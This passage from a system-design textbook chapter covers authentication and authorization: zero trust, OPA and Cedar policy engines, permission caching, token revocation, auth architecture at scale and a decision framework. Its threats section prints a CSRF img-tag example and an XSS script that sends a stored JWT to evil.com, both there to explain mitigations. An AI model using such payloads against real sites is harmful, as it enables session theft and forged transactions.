  -> If VPN compromised,                      2. Device trust (enrolled, patched,
     attacker has full access                    encrypted, has cert)
                                              3. Context (location, time, risk score)
                                              4. Per-app authorization policy
                                           -> Grants access to ONLY that app
                                           -> No VPN, no "trusted network" concept
  
  Implementation components:
  +-------------------------------------------------------------------+
  | Component           | Purpose                                      |
  +-------------------------------------------------------------------+
  | Access Proxy        | Intercepts all requests, enforces policy     |
  | Identity Provider   | Authenticates users (SSO + MFA)              |
  | Device Trust Engine | Evaluates device health and compliance       |
  | Policy Engine       | Defines per-app access rules                 |
  | Access Control Lists| Maps users/groups to applications            |
  +-------------------------------------------------------------------+
  
  Open-source implementations:
  - Pomerium (Go-based access proxy)
  - Cloudflare Access (managed Zero Trust service)
  - Tailscale (WireGuard-based zero trust networking)
  - Zscaler Private Access (enterprise)
```

---

## 19.14 Authorization in Distributed Systems — Policy Engines

In distributed systems with hundreds of services, authorization decisions cannot be hardcoded
into each service. You need a **centralized policy engine** that all services query.

### Open Policy Agent (OPA) — The De Facto Standard

```
  OPA is a general-purpose policy engine that decouples POLICY from CODE.
  
  Without OPA:                          With OPA:
  
  // Hardcoded in every service          // Service asks OPA
  if user.role == "admin" {              allowed = opa.evaluate(
    allow()                                input: {user, action, resource}
  }                                      )
  // Must redeploy to change rules      // Policy change = update OPA, no redeploy
  
  Architecture:
  
  +--------+   "Can user 42     +--------+   Evaluate   +--------+
  | Service|   delete order 99?"| OPA    |   policy     | Policy |
  | (any)  |------------------>| (sidecar|<------------>| (Rego  |
  +--------+                   |  or     |              |  files)|
       ^                       |  server)|              +--------+
       |                       +--------+
       | allow: true/false          |
       +----------------------------+
  
  OPA policy example (Rego language):
  
  package authz
  
  default allow = false
  
  # Admins can do anything
  allow {
    input.user.role == "admin"
  }
  
  # Users can only read their own orders
  allow {
    input.action == "read"
    input.resource.type == "order"
    input.resource.owner_id == input.user.id
  }
  
  # Editors can edit non-published content
  allow {
    input.user.role == "editor"
    input.action == "edit"
    input.resource.status != "published"
  }
  
  Used by: Kubernetes (admission control), Envoy/Istio, Netflix, Goldman Sachs
```

### AWS Cedar — Amazon's Policy Language

```
  Cedar is Amazon's open-source policy language (powers Amazon Verified Permissions).
  
  Cedar policy example:
  
  // Admins can perform any action on any resource
  permit(
    principal in Group::"admins",
    action,
    resource
  );
  
  // Users can view their own photos
  permit(
    principal,
    action == Action::"view",
    resource
  ) when {
    resource.owner == principal
  };
  
  // Deny access outside business hours
  forbid(
    principal,
    action,
    resource
  ) when {
    context.time.hour < 9 || context.time.hour > 17
  };
  
  Cedar vs OPA:
  +-------------------+----------------------------+------------------------------+
  | Aspect            | OPA (Rego)                 | Cedar                        |
  +-------------------+----------------------------+------------------------------+
  | Language          | Rego (logic programming)   | Cedar (purpose-built)        |
  | Learning curve    | Steeper                    | Gentler (English-like)       |
  | Performance       | Fast (compiled)            | Very fast (Rust engine)      |
  | Ecosystem         | Larger (CNCF graduated)    | Newer (growing, AWS-backed)  |
  | Entity model      | Flat (JSON input)          | Hierarchical (built-in)      |
  | Best for          | Kubernetes, infrastructure | Application-level authz      |
  +-------------------+----------------------------+------------------------------+
```

### Permission Caching Strategy

```
  Problem: Every API call requires an authorization check. If the policy engine
  adds 5ms per call, that's 5ms * 10 services = 50ms added latency per request.
  
  Solution: Cache authorization decisions.
  
  +--------+   1. Check cache    +-----------+
  | Service|-------------------->| Local     |   HIT: return decision (0.01ms)
  |        |                     | Cache     |
  |        |   2. Cache MISS     | (Caffeine)|
  |        |-------------------->+-----------+
  |        |                     | OPA /     |   Evaluate policy (2-5ms)
  |        |   3. Cache result   | Cedar     |
  |        |<--------------------+-----------+
  +--------+
  
  Cache key: hash(user_id, action, resource_type, resource_id)
  Cache TTL: 30-300 seconds (balance freshness vs performance)
  
  Cache invalidation:
  - Role change: invalidate all cache entries for that user
  - Policy update: invalidate ALL entries (or use versioned policies)
  - Broadcast via Redis Pub/Sub or RabbitMQ to all service instances
  
  Important: Cache DENY decisions too (prevents repeated expensive lookups
  for unauthorized users).
```

---

## 19.15 Security Threats and Mitigation

### Authentication Attacks

```
  1. CREDENTIAL STUFFING
  +-------------------------------------------------------------------+
  | Attack: Attacker uses leaked username/password pairs from other    |
  |         breaches (billions available on the dark web) to try       |
  |         logging into your system.                                  |
  |                                                                    |
  | Mitigation:                                                        |
  | - Rate limiting on login endpoint (5 attempts per minute per IP)  |
  | - CAPTCHA after 3 failed attempts                                  |
  | - Check passwords against Have I Been Pwned API on registration   |
  | - MFA (attacker has password but not second factor)               |
  | - Device fingerprinting (flag logins from new devices)            |
  | - Monitor for distributed credential stuffing (many IPs, one user)|
  +-------------------------------------------------------------------+
  
  2. BRUTE FORCE
  +-------------------------------------------------------------------+
  | Attack: Trying every possible password combination.                |
  |                                                                    |
  | Mitigation:                                                        |
  | - Account lockout after N failed attempts (but: denial of service!)|
  | - Progressive delays: 1s, 2s, 4s, 8s, 16s between attempts       |
  | - Long minimum password length (12+ chars) -> exponential space   |
  | - bcrypt/Argon2 with high work factor (each attempt costs ~200ms) |
  +-------------------------------------------------------------------+
  
  3. PHISHING
  +-------------------------------------------------------------------+
  | Attack: Fake login page tricks user into entering credentials.     |
  |                                                                    |
  | Mitigation:                                                        |
  | - WebAuthn/Passkeys (origin-bound, phishing-IMMUNE)               |
  | - Hardware security keys (FIDO2)                                   |
  | - DMARC/DKIM/SPF for email (prevent spoofed email domains)        |
  | - User education (but education alone is NOT sufficient)           |
  +-------------------------------------------------------------------+
```

### Session and Token Attacks

```
  4. SESSION FIXATION
  +-------------------------------------------------------------------+
  | Attack: Attacker sets a known session ID in victim's browser,     |
  |         then waits for victim to log in using that session.        |
  |                                                                    |
  | Mitigation:                                                        |
  | - ALWAYS regenerate session ID after successful login              |
  | - Don't accept session IDs from URL parameters                    |
  | - Set Secure, HttpOnly, SameSite flags on session cookies         |
  +-------------------------------------------------------------------+
  
  5. CSRF (Cross-Site Request Forgery)
  +-------------------------------------------------------------------+
  | Attack: Malicious site tricks authenticated user's browser into   |
  |         making unintended requests to your site.                   |
  |                                                                    |
  | Example: User is logged into bank.com. Visits evil.com which has: |
  | <img src="https://bank.com/transfer?to=attacker&amount=10000">   |
  | Browser sends bank.com cookies automatically!                     |
  |                                                                    |
  | Mitigation:                                                        |
  | - SameSite=Strict or Lax on cookies (blocks cross-origin sends)   |
  | - CSRF tokens (unique per session, validated on every POST)       |
  | - Check Origin/Referer headers                                    |
  | - JWT in Authorization header (NOT cookies) is immune to CSRF     |
  +-------------------------------------------------------------------+
  
  6. XSS (Cross-Site Scripting) — Token Theft
  +-------------------------------------------------------------------+
  | Attack: Attacker injects JavaScript that steals tokens stored in  |
  |         localStorage or accessible JavaScript variables.           |
  |                                                                    |
  | <script>                                                           |
  |   fetch('https://evil.com/steal?token=' + localStorage.getItem('jwt'))
  | </script>                                                          |
  |                                                                    |
  | Mitigation:                                                        |
  | - NEVER store tokens in localStorage (accessible to any JS)       |
  | - Store tokens in HttpOnly cookies (JavaScript CANNOT access)     |
  | - Or store access tokens in JavaScript memory only (cleared on    |
  |   page close, not persisted)                                       |
  | - Content Security Policy (CSP) headers to block inline scripts   |
  | - Sanitize ALL user input (prevent script injection)              |
  +-------------------------------------------------------------------+
  
  7. TOKEN REPLAY
  +-------------------------------------------------------------------+
  | Attack: Attacker intercepts a valid token and replays it.          |
  |                                                                    |
  | Mitigation:                                                        |
  | - Short token expiry (5-15 minutes for access tokens)             |
  | - Bind tokens to client fingerprint (IP, User-Agent hash)        |
  | - Use token binding (DPoP — Demonstrating Proof of Possession)    |
  | - Always use HTTPS (prevents interception)                        |
  +-------------------------------------------------------------------+
```

### Secure Token Storage Decision Matrix

```
  +----------------------------+----------+----------+----------+--------+
  | Storage Location           | XSS Safe | CSRF Safe| Persists | Recomm.|
  +----------------------------+----------+----------+----------+--------+
  | localStorage               | NO!      | Yes      | Yes      | NEVER  |
  | sessionStorage             | NO!      | Yes      | Tab only | AVOID  |
  | HttpOnly Secure Cookie     | Yes      | NO (need | Yes      | GOOD   |
  |                            |          |  SameSite)|         | (for   |
  |                            |          |          |          | refresh)|
  | HttpOnly + SameSite=Strict | Yes      | Yes      | Yes      | BEST   |
  | In-memory (JS variable)    | Partial  | Yes      | No       | GOOD   |
  |                            |          |          |          | (access)|
  +----------------------------+----------+----------+----------+--------+
  
  Recommended pattern:
  - Access token: In-memory JavaScript variable (cleared on tab close)
  - Refresh token: HttpOnly + Secure + SameSite=Strict cookie
  - On page load: use refresh token to get new access token silently
```

---

## 19.16 Token Lifecycle Management at Scale

### Token Revocation Strategies

```
  Problem: JWTs are stateless — the server can't "invalidate" a token.
  If an admin disables a user's account, their existing JWT still works
  until it expires.
  
  Strategy 1: SHORT EXPIRY (the simplest)
  - Access tokens expire in 5-15 minutes
  - Even if compromised, the window of exploitation is tiny
  - Combined with refresh token rotation for seamless UX
  
  Strategy 2: TOKEN BLACKLIST
  +--------+   Revoke user 42    +--------+
  | Admin  |------------------->| Auth    |
  +--------+                    | Server  |
                                +----+----+
                                     |
                      Add to blacklist: jti=abc123
                                     |
                                +----v-----+
                                | Blacklist |  (Redis SET)
                                | jti:abc123|  TTL = remaining token lifetime
                                +-----------+
  
  Every API request:
  1. Validate JWT signature ✓
  2. Check blacklist: SISMEMBER blacklist jti:abc123
     -> Found? REJECT (token revoked)
     -> Not found? ALLOW
  
  Note: This adds STATE to a "stateless" system.
  Blacklist is small (only revoked tokens, with TTL auto-cleanup).
  
  Strategy 3: TOKEN VERSIONING
  - Store a "token_version" per user in a fast store (Redis)
  - JWT payload includes version: {"sub": "user42", "ver": 5}
  - On revocation: increment user's version to 6
  - On validation: if JWT.ver < stored_version -> REJECT
  
  Strategy 4: REFRESH TOKEN REVOCATION
  - Don't revoke access tokens (they expire quickly)
  - Revoke the REFRESH token instead
  - User can't get new access tokens after revocation
  - Existing access token works for at most 5-15 more minutes
  - Acceptable trade-off for most applications
```

### Auth Architecture at Scale

```
  High-scale architecture for auth (millions of users):
  
  +--------+     +-------------+     +------------------+
  | Client |---->| API Gateway |---->| Auth Service     |
  +--------+     | (validates  |     | (login, register,|
                 |  JWT on     |     |  token issue,    |
                 |  every req) |     |  MFA, revocation)|
                 +------+------+     +--------+---------+
                        |                     |
                 +------v------+     +--------v---------+
                 | JWKS Cache  |     | User DB          |
                 | (public keys|     | (PostgreSQL)     |
                 |  cached     |     |                  |
                 |  locally)   |     | Credentials DB   |
                 +-------------+     | (separate,       |
                                     |  encrypted)      |
                                     +--------+---------+
                                              |
                                     +--------v---------+
                                     | Redis            |
                                     | - Sessions       |
                                     | - Blacklist      |
                                     | - Rate limits    |
                                     | - Token versions |
                                     +------------------+
  
  Scaling considerations:
  +-------------------------------------------------------------------+
  | Component        | How to Scale                                    |
  +-------------------------------------------------------------------+
  | JWT validation   | Stateless — any server can validate (just needs|
  |                  | the public key, cached locally via JWKS)       |
  +-------------------------------------------------------------------+
  | Auth Service     | Horizontal scaling (stateless, DB handles state)|
  |                  | Read replicas for user lookups                 |
  +-------------------------------------------------------------------+
  | Token blacklist  | Redis Cluster (fast SET membership checks)     |
  |                  | TTL auto-cleanup (no manual purging)           |
  +-------------------------------------------------------------------+
  | Rate limiting    | Redis-based (per-IP, per-user sliding window)  |
  +-------------------------------------------------------------------+
  | Password hashing | CPU-intensive (Argon2). Separate worker pool   |
  |                  | to avoid blocking API request handling         |
  +-------------------------------------------------------------------+
  
  JWKS (JSON Web Key Set) caching:
  - Auth server publishes public keys at: /.well-known/jwks.json
  - API Gateway and all services cache the JWKS (refresh every 5-60 min)
  - Key rotation: add new key to JWKS, sign new tokens with new key,
    keep old key in JWKS until all old tokens expire, remove old key
```

---

## 19.17 Choosing the Right Auth — Decision Framework

```
  "How should I authenticate users in my system?"
  
  +-------------------------------------------------------------------+
  | Scenario                           | Recommended Approach          |
  +-------------------------------------------------------------------+
  | Traditional web app (server-       | Session-based (HttpOnly       |
  | rendered HTML)                     | cookies) + CSRF protection    |
  +-------------------------------------------------------------------+
  | SPA (React, Angular, Vue)         | OAuth 2.0 + PKCE with JWT    |
  |                                    | Access token in memory,       |
  |                                    | refresh in HttpOnly cookie    |
  +-------------------------------------------------------------------+
  | Mobile app (iOS, Android)         | OAuth 2.0 + PKCE with JWT    |
  |                                    | Refresh token in secure       |
  |                                    | storage (Keychain, Keystore)  |
  +-------------------------------------------------------------------+
  | Public API for third parties      | OAuth 2.0 (Auth Code flow)    |
  |                                    | or API keys (for simple cases)|
  +-------------------------------------------------------------------+
  | Service-to-service (microservices) | mTLS (preferred) or           |
  |                                    | Client Credentials JWT        |
  +-------------------------------------------------------------------+
  | Enterprise SSO                    | SAML (legacy) or OIDC         |
  |                                    | (modern) with IdP (Okta,      |
  |                                    | Azure AD)                     |
  +-------------------------------------------------------------------+
  | Consumer-facing (new apps)        | Passkeys (WebAuthn) + fallback|
  |                                    | to email magic link or        |
  |                                    | social login (OIDC)           |
  +-------------------------------------------------------------------+
  | IoT devices                       | Certificate-based (X.509) or  |
  |                                    | OAuth 2.0 Device Auth Grant   |
  +-------------------------------------------------------------------+
  | High-security (banking, govt)     | MFA mandatory: WebAuthn +     |
  |                                    | TOTP, short-lived tokens,     |
  |                                    | step-up auth for sensitive ops|
  +-------------------------------------------------------------------+
  
  "How should I authorize users in my system?"
  
  +-------------------------------------------------------------------+
  | Scenario                           | Recommended Model             |
  +-------------------------------------------------------------------+
  | Simple app (< 10 roles)           | RBAC (roles + permissions)    |
  +-------------------------------------------------------------------+
  | Complex enterprise (departments,  | ABAC (attribute-based with    |
  | time-based, location-based rules) | OPA or Cedar policy engine)   |
  +-------------------------------------------------------------------+
  | File sharing, document access     | ReBAC (relationship-based,    |
  | (Google Drive-like)               | Zanzibar model, SpiceDB)      |
  +-------------------------------------------------------------------+
  | Microservices with many services  | Centralized policy engine     |
  |                                    | (OPA sidecar or Cedar)        |
  +-------------------------------------------------------------------+
  | Multi-tenant SaaS                 | RBAC per tenant + tenant      |
  |                                    | isolation at data layer       |
  +-------------------------------------------------------------------+
```

---

### How Google Authentication Works

1. User visits a Google service (Gmail, Drive)
2. Redirected to `accounts.google.com` (centralized SSO)
3. Authenticates with password + MFA (TOTP or hardware key push)
4. Google issues a session + OIDC tokens
5. SSO cookie is set on `google.com` domain — works across all Google services
6. Third-party apps use OAuth 2.0 + OIDC ("Sign in with Google")
7. Google uses **Zanzibar** (ReBAC) for fine-grained authorization across Drive, Docs, etc.

### How GitHub Authentication Works

1. User logs in with password + MFA (WebAuthn / TOTP)
2. GitHub issues a session for the web UI
3. For API access: **Personal Access Tokens (PATs)** or OAuth apps
4. GitHub Apps use OAuth 2.0 Authorization Code flow with scoped permissions
5. Repository permissions use a **combination of RBAC** (owner, maintainer,
   contributor, viewer) and **org-level policies**
6. SSH keys for Git operations use public-key cryptography

---

## 19.18 Key Takeaways

```
+-----------------------------------------------------------------------+
|           Authentication & Authorization — Key Takeaways               |
+-----------------------------------------------------------------------+
|                                                                        |
|  1. AuthN = "Who are you?" AuthZ = "What can you do?" Never conflate  |
|     them. Authentication ALWAYS precedes authorization.                |
|                                                                        |
|  2. Never store passwords in plaintext. Use Argon2id with unique      |
|     salts. For NEW apps, prefer passwordless (passkeys/WebAuthn).     |
|                                                                        |
|  3. Passkeys (WebAuthn/FIDO2) are the future: phishing-immune, no    |
|     shared secrets, backed by Apple/Google/Microsoft. Use them as      |
|     the primary auth method for new consumer applications.            |
|                                                                        |
|  4. JWTs are stateless but hard to revoke. Use short expiry (5-15    |
|     min) + refresh token rotation. Store access tokens in memory,     |
|     refresh tokens in HttpOnly SameSite=Strict cookies. NEVER use     |
|     localStorage.                                                      |
|                                                                        |
|  5. OAuth 2.0 = authorization, OIDC = authentication on top of OAuth. |
|     Use Authorization Code + PKCE for SPAs/mobile. Client Credentials |
|     for service-to-service. Implicit flow is DEPRECATED.              |
|                                                                        |
|  6. mTLS is the gold standard for service-to-service auth in          |
|     microservices. Istio/Linkerd handle it automatically. SPIFFE/SPIRE|
|     provides standardized workload identity.                          |
|                                                                        |
|  7. In microservices: Gateway auth (simplest), token propagation      |
|     (most secure), token exchange (least privilege). Use mTLS + JWT   |
|     for defense-in-depth.                                             |
|                                                                        |
|  8. Zero Trust = "never trust, always verify." Authenticate every     |
|     request based on identity + device + context. No trusted networks.|
|     Google BeyondCorp pioneered this — no VPN needed.                 |
|                                                                        |
|  9. Authorization models: RBAC for simple apps (< 10 roles), ABAC    |
|     for complex enterprise policies, ReBAC (Zanzibar) for relationship|
|     based access (Google Drive model). Use OPA or Cedar as policy     |
|     engines in distributed systems.                                   |
|                                                                        |
| 10. Token revocation strategies: short expiry (simplest), blacklist   |
|     in Redis (adds state), token versioning (per-user), refresh token |
|     revocation (acceptable for most apps).                            |
|                                                                        |
| 11. Security threats to mitigate: credential stuffing (rate limit +   |
|     MFA), CSRF (SameSite cookies), XSS token theft (HttpOnly cookies),|
|     session fixation (regenerate ID on login), brute force (Argon2 +  |
|     progressive delays).                                               |
|                                                                        |
| 12. Use a dedicated identity provider (Okta, Auth0, Keycloak) rather  |
|     than building auth from scratch. Auth is too critical and too      |
|     complex to get wrong. Focus your engineering on your product.     |
|                                                                        |
+-----------------------------------------------------------------------+
```

---

*Next chapter: [Chapter 20 - Security Patterns in System Design](20-security.md)*
